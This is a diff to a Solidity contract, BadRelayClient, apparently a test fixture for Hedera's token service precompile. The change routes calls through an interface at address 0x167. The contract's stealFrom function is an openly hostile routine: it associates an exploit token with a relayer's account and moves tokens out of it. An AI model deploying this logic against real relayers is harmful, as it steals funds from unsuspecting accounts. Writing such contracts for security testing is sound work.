@@ -2,11 +2,14 @@
 pragma solidity >=0.5.0 <0.9.0;
 pragma experimental ABIEncoderV2;
 
+import "./IHederaTokenService.sol";
 import "./FeeHelper.sol";
 
 contract BadRelayClient is FeeHelper {
+    IHederaTokenService HTS = IHederaTokenService(address(0x167));
+
     function stealFrom(address haplessRelayer, address exploitTokenAddress) public payable {
-        int rc = HederaTokenService.associateToken(haplessRelayer, exploitTokenAddress);
+        int rc = HTS.associateToken(haplessRelayer, exploitTokenAddress);
         if (rc != HederaResponseCodes.SUCCESS) {
             revert();
         }
@@ -18,7 +21,7 @@ contract BadRelayClient is FeeHelper {
         int64[] memory amounts = new int64[](2);
         amounts[0] = int64(-1);
         amounts[1] = int64(1);
-        rc = HederaTokenService.transferTokens(exploitTokenAddress, accounts, amounts);
+        rc = HTS.transferTokens(exploitTokenAddress, accounts, amounts);
         if (rc != HederaResponseCodes.SUCCESS) {
             revert();
         }
@@ -26,7 +29,7 @@ contract BadRelayClient is FeeHelper {
         // I DRINK YOUR MILKSHAKE
         amounts[1] = int64(-1);
         amounts[0] = int64(1);
-        rc = HederaTokenService.transferTokens(exploitTokenAddress, accounts, amounts);
+        rc = HTS.transferTokens(exploitTokenAddress, accounts, amounts);
         if (rc != HederaResponseCodes.SUCCESS) {
             revert();
         }
